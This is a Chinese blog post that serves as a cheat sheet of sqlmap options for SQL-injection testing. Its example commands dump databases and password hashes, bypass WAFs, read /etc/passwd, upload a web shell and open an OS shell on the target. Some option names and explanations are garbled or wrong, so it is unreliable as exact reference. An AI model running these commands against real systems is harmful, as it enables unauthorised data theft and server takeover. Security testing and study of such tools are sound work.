---
title: SQLMAP速查表
date: 2019-03-03 03:20:28
categories: WEB安全
tags: tools
---
<blockquote class="blockquote-center">时光匆匆流逝过，平平淡淡才是真。忍耐任由风雨过，守得云开见月明。</blockquote>
<div align="middle"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1344340338&auto=1&height=66"></iframe></div>
注：由于自己sqlmap命令不是很熟，经常只会使用常见的那几个参数，所以特地写了博客，将所有的命令一个一个的操作了一遍，然后码字，过程是辛苦的，但收货满满，很开心，晚安，世界！
## 简介：

SQLMAP是开源的渗透测试工具，主要用于自动化监测和利用SQL注入漏洞，它具有功能强大的检测引擎，能针对各种不同类型的数据库去获取数据库服务器的权限，获取数据库所存储的数据，访问并且可以导出操作系统的文件，甚至通过外带数据连接的方式执行操作系统命令。

## 所支持的DBMS：

SQLMAP支持市面上常见的DBMS，包括[MySQL](https://en.wikipedia.org/wiki/MySQL)，[Oracle](https://en.wikipedia.org/wiki/Oracle_Database)，[PostgreSQL](https://en.wikipedia.org/wiki/PostgreSQL)，[Microsoft SQL Server](https://en.wikipedia.org/wiki/Microsoft_SQL_Server)，[Microsoft Access](https://en.wikipedia.org/wiki/Microsoft_Access)，[IBM DB2](https://en.wikipedia.org/wiki/IBM_DB2)，[SQLite](https://en.wikipedia.org/wiki/SQLite)，[Firebird](https://en.wikipedia.org/wiki/Firebird_(database_server))和SAP MaxDB。

## 五种注入模式：

- 基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
- 基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟是否执行（即页面返回时间是否增加）来判断。
- 基于报错注入，即页面会返回错误信息，或者把注入的语句直接返回在页面中。
- 联合查询注入，在使用union联合查询的情况下注入
- 堆查询注入，可以在同时执行多条语句的情况下注入

## 七种测试等级：

使用参数-v指定对应的测试等级，默认是等级1.如果想看到sqlmap发送的测试payload最好的等级是3,。

```
·0：只显示Python的回溯、错误和关键消息；
·1：同时显示基本信息和警告信息；
·2：同时显示调试信息；
·3：同时显示注入的payload；
·4：同时显示HTTP请求；
·5：同时显示HTTP响应头；
·6：同时显示HTTP响应页面页面。
```



## 基本功能：

1.在sqlmap 0.8版本之后，提供了数据库直连的功能，使用参数-d作为SQL数据库的客户端程序来连接数据库的端口，需要安装一些python中的依赖库便可以进行访问，其语法格式为：

```
sqlmap.py -d "DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME"
```

2.与BurpSuite，Google结合使用，支持正则表达式限定测试目标

3.可以对HTTP头部信息（GET,POST,Cookie,Referer,User-Agent等）进行自动注入或者手动注入。

​	另外Referer和User-Agent可以具体指定某一个值去进行SQL注入挖掘

​	如果cookie过期之后，sqlmap会自动处理set-cookie头，更新cookie的信息

4.进行限速处理：设置最大并发和延迟发送。

5.支持基本身份认证（Basic Authentication），摘要认证（Digest  Authentication），NTLM认证，CA身份认证

6.能够进行数据库版本的发现，用户的发现，进行提权，hash枚举和字典破解，暴力破解表列名称

7.能够利用SQL注入进行文件上传下载，支持用户定义函数（UDF）利用存储过程执行存储过程，执行操作系统命令，访问Windows注册表

8.与w3af,metasploit集成结合使用，能够基于数据库进程进行提权和上传执行后门。

下载地址：[http://sqlmap.org/](http://sqlmap.org/)



## 操作选项:

### 基本操作：

```
-h:显示帮助信息退出

--hh:显示更多的信息并退出

--version：显示程序版本并退出

-v:设置等级，默认为等级1
```

### 指定目标：

```
GET方法：
	-d: 表示sqlmap将自己作为客户端去连接数据库

	-u或者--url: 指定目标系统的URL，
		-p：对指定的参数进行SQL注入检测
		-f: 检测数据库，服务器等（fingerprint）信息，
		-b或者--banner：获取数据库版本信息和数据库类型
		--batch:不与使用者进行信息交互，直接执行
		
		例：sqlmap.py -u "http://www.xxx.com/?id=1" -p id -f --batch

	-g：对Google的搜索结果进行SQL注入探测.例如：sqlmap.py -g "inurl:\".php?id=1\."
	--force-ssl:强制使用SSL/HTTPS协议
		例：sqlmap.py -u "https://www.xxx.com/?id=1" --force-ssl


POST方法：
	-r: 将HTTP请求文件保存到文本文档中，使用参数-r读取文本文件的参数进行SQL注入.例：sqlmap.py -r request.txt
	-l: 将burpsuite log文件保存到文本文档中，使用参数-l读取文本文档的参数进行SQL注入。例：sqlmap.py -l log.txt
	-c:对配置文件进行SQL注入探测
	
```

### 枚举模块：

```
	-a/--all:获取所有信息
	-b/--banner : 获取DBMS banner
	--dbs:枚举DBMS中所有的数据库
	–current-user:获取当前用户
	--privileges-U username(当前账号/CU) ：查看当前账号的权限
	--roles:列出数据库管理员角色，仅适用于当前数据库是Oracle
	–current-db : 获取当前数据库
	–users : 枚举DBMS用户
	–passwords : 枚举DBMS用户密码hash值
	–tables: 枚举DBMS数据库管理系统中的表
	--columns:枚举DBMS数据库管理系统中的列
	--schema:枚举DBMS数据库管理系统的模式
	--dump:转储DBMS数据库表项，后面加-C表示转储某列，-T转储某表，-D转储某数据库，--start,--stop,--first,--last指定开始结束，开头结尾。
	--dump-all：转储所有的DBMS数据库表项
	-D：指定枚举的DBMS中的数据库
	-T：指定要枚举的表
	-C：指定要枚举的列
	-D 数据库名 --tables:查找指定数据库中的表
	-D 数据库名 -T 表名 --columns：查找指定数据库的某个表中的列
	--exclude-sysdbs:忽略掉系统数据库
	--count:查找表中的记录数
	--schema:查找数据库的架构，包含所有的数据库，表和字段，以及各自的类型，一般与--exclude-sysdbs
	--batch：默认每次自动执行
	--sql-query/--sql/shell:运行自定义的SQL语句，例：--sql-query="select * from users;"所得到的内容被保存到dump目录中
```

### 请求模块：

```
	--data=DATA :指定post数据包中被传输的值
		例：sqlmap.py -u "http：//www.xxx.com" --data="name=123&pass=456" -f
	--cookie=COOKIE:指定cookie值登录web程序，并且会尝试自动注入cookie值
		需要在level 2或者大于level 2等级才会进行cookie注入。
		如果cookie被服务器端更新，那么sqlmap也会自动更新cookie值。
		例:sqlmap -u "http://192.168.149.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id  --cookie="security=low; PHPSESSID=d806c1f76f24a9687640ce497afc8f20" --batch
	--param-del:告知sqlmap变量分隔符。web程序一般默认是&符号作为分隔符，如果并非&，则需要指定变量分隔符
		例：sqlmap.py -u "http://www.xxx.com" --data="user=123;pass=456" --param-del=";" -f
	
	指定HTTP头部信息：
	-user-agent:指定UA头部信息。sqlmap默认使用UA为：sqlmap/1.0-dev-版本号 http://sqlmap.org
	--random-agent:使用sqlmap/txt/user-agents.txt字典中的UA头部进行随机替换
	
	--host="host header" ：指定host头部信息，当level为5的时候才会检测host值
	--referer="REFERER" ：指定Referer头部信息，当level大于等于三 ,才回去检测referer头部是否存在注入
	--method=GET/POST：指定使用get或者POST方式发送数据，默认以get方式发送
	
	延时：
		
	--delay=DELAY:每次HTTP（S）请求之间延迟时间，值为浮点数，单位为秒，默认无延迟
	--timeout=TIMEOUT ：设置超时时间，默认30秒
	--retries=RETRIES:设置重连次数，默认3次
	--randomize:设置随机改变的参数值
	--scope:利用正则表达式过滤日志内容
	
	--safe-url=SAFEURL ：指定需要去重复扫描的地址
	--safe-freq：指定每发送多少次的注入请求之后接着发正常请求
		注：有些web应用程序会在攻击者多次访问错误的请求时屏蔽掉以后的所有请求，所以设置这两个参数防止以后无法进行注入
		例：sqlmap.py -u "https://www.xxx.com/?id=1" --safe-url=“http://www.xxx.com” --safe-freq=3 
	--skip-urlencode:跳过URL编码的载荷
		注：默认在get请求中是需要对传输数据进行编码，但是有些web服务器不遵守RPC标准编码，使用原始字符提交数据，所以使用这个参数使sqlmap不使用URL编码的参数进行测试
	--eval=EBALCODE：在请求之前执行提供的python代码。
		例：sqlmap.py -u "http://www.xxx.com/?id=1&hash=c4ca4238a0b923820dcc509a6f75849b" --evel="import hashlib;hash=hashlib.md5(id).hexdigest()"
```

### 身份认证模块：

```
	--auth-type=AUTH:指定HTTP认证类型（Basic, Digest, NTLM or PKI）
	--auth-cred=AUTH:指定HTTP认证证书（格式为：name:password）
		例：sqlmap.py -u "http://www.xxx.com/?id=1" --auth-type=Basic --auth-cred "user:pass"
	--auth-file=AUTH:指定HTTP认证PEM格式的证书/私钥文件
	
	
	代理：
	--proxy="http://127.0.0.1:8081" //将设置国外的代理服务器，传递给本地的8081端口，这个命令是将本地的8081端口反弹到国外的服务器上面去执行命令
	--proxy-cred="name:pass"
		例：sqlmap -u "http://www.xxx.com/?id=1" --proxy="http://127.0.0.1:8081" --proxy-cred="user:pass" -f

	--ignore-proxy：忽略系统级代理设置，通常用于扫描本地网络目标。
```

### 代理模块：

```
	--proxy="http://127.0.0.1:8081" //将设置国外的代理服务器，传递给本地的8081端口，这个命令是将本地的8081端口反弹到国外的服务器上面去执行命令
	--proxy-cred="name:pass"
		例：sqlmap -u "http://www.xxx.com/?id=1" --proxy="http://127.0.0.1:8081" --proxy-cred="user:pass" -f

	--ignore-proxy：忽略系统级代理设置，通常用于扫描本地网络目标。
```



### 优化模块：

```
	-o 开启所有优化开关  
	--predict-output 预测常见的查询输出  
	--keep-alive 使用持久的HTTP（S）连接  
	--null-connection 从没有实际的HTTP响应体中检索页面长度  
	--threads=THREADS：设置最大的HTTP（S）请求并发量（默认为1）
```



### 注入模块：

```
	-p:指定扫描的参数，也可以指定HTTP头部字段
		例：sqlmap.py -u "http://www.xxx.com/？id=1" -p "User-Agent,Referer，id"
	--skip：跳过对某些参数进行测试。当使用--level的值很大但是有个别参数不想去测试的时候使用--skip去跳过
		例：sqlmap.py -u "http://www.xxx.com/？id=1" --skip "User-Agent,Referer，id"
	-u:设置URL注入点。当有些网站将参数和值一起加入到URL链接中，sqlmap是默认不对其进行扫描的，所以我们需要去指定对某个参数值进行注入
		例：sqlmap.py -u "http://www.xxx.com/param1/value1*/param2/value2*" 
	--dbms:设置目标服务器所使用的DBMS
		例：--dbms="mysql"
	--os:指定目标的操作系统
		例：--os="linux"
	--invalid-bignum:给参数值给与最大值让其失效
	--invalid-logical：使用布尔判断使取值失效
	--no-cast:榨取数据时，sqlmap将所有的结果转换成字符串，并用空格替换null值（老版本mysql数据库需要开启此开关）
	--tamper=TAMPER：使用给定的脚本去混淆绕过应用层的过滤，比如waf/ids等。该文件存放在/sqlmap/tamper文件下
	例：sqlmap.py -u "www.xxx.com/?id=1" -p "id" --tamper="between.py,overlongutf8more.py,lowercase.py "
```



### 检测模块：

```
	--level :共有5级，默认等级1，可以自己制定，推荐等级3
	--risk:共有4级，默认等级1，risk升高可造成数据被篡改等风险
	--string:指定页面返回某个字符串则为真
	--not-string:指定页面不返回某个字符串则为真
	--Regexp:当查询的值为真时，使用正则表达式去匹配
	--code：当查询的值为真时，执行HTTP code
	
```

### 技术类型：

```
	sqlmap默认使用这些操作
	--technique=TECH    指定sqlmap使用的检测技术，默认情况下会测试所有的方式。
    --time-sec=TIMESEC  设置延迟时间，基于时间的注入检测默认延迟时间是5秒
    --union-cols=UCOLS  联合查询时默认是1-10列，当level=5时会增加到测试50个字段数，可以使用此参数设置查询的字段数。
    --union-char=UCHAR  默认情况下sqlmap针对UNION查询的注入会使用NULL字符；
    --union-from=UFROM  在UNION查询SQL注入的FROM部分中使用的表
    --dns-domain=DNS..  攻击者控制了某DNS服务器，使用此功能可以提高数据查询的速度
    --second-order=S..  使用此参数指定到哪个页面获取响应判断真假，--second-order后面跟一个判断页面的URL地址。
```

### 指纹信息：

```
	-f/--fingerprint:查询目标系统的数据库管理系统的指纹信息
	-b/--banner:返回数据库的版本信息
```

### 爆破模块：

```
用于：
	mysql版本<5.0的时候，没有information_schema库
	mysql版本>=5.0，但无权读取information_schema库
	微软的access数据库，默认无权读取MSysObjects库。
	
	--common-tables:爆破表名
		例：sqlmap.py -u "http://www.baidu.com/?id=1" --common-tables
	--common-columns:暴力破解列名

```

### UDF注入模块：

```
	UDF：自定义函数，利用UDF函数达到执行操作系统命令
	--udf-inject:注入用户自定义函数
	--shared-lib=SHLIB:指定共享库的本地路径
	这两条命令一起使用
```

### 系统文件操作：

```
	--file-read=RFILE:从后端DBMS文件系统中读取文件（读取系统文件）
		例：--file-read="/etc/passwd"
	--file-write=SHELL.PHP --file-dest=DFILE：把当前系统的文件写入到目标服务器的某个目录下去
		
```

### OS系统访问：

```
	--os-cmd:运行任意操作系统命令（适用于数据库为mysql，postgresql，或Sql Server，并且当前用户有权限使用特定的函数）
		例：--os-cmd id :执行id命令，后期是与sqlmap进行交互，生成UDF函数在操作系统下执行命令
	--os-shell:获取一个shell（目标系统为管理员权限，并且得知绝对路径）	
```

### Windows注册表模块：

```
	--reg-read:读取注册表的值
	--reg-add:写入注册表值
	--reg-del:删除注册表值
	--reg-key,--reg-value,--reg-data,--reg-type:注册表辅助选项
```

### 一般性参数：

```
	-s:指定sqlite会话文件保存位置
	-t:记录流量文件保存位置
	--charset:强制字符编码
		例：--charset=GBK
	--crawl:从开始位置爬站深度
		例：--crawl=3
	--csv-del:dump下来的数据以CVS格式保存
	--dbms-creb:指定数据库账号
	--slush-session:清空session
	--fresh-queries：忽略session查询结果
	--hex：当dump下非ASCii字符内容时，将其编码成16进账形式，收到后解析还原
	--save:将命令保存成配置文件
```

### 批处理模块：

```
	--check-waf:检测WAF/IPS/IDS
	--hpp:绕过WAF/IPS/ISD，尤其是对ASP/IIS和ASP.NET/IIS有效
	--identify-waf:彻底的WAF/IPS/IDS检测，支持三十多种产品
```

### 杂项模块：

```
	--mobile：模拟智能手机设备，修改User-Agent为手机端的UA
	--purge-output:清空output文件夹
	--smart：当有大量检测目标时，只修改基于错误的检测结果
	--wizard:设置用户向导参数，教你一步步针对目标注入
```

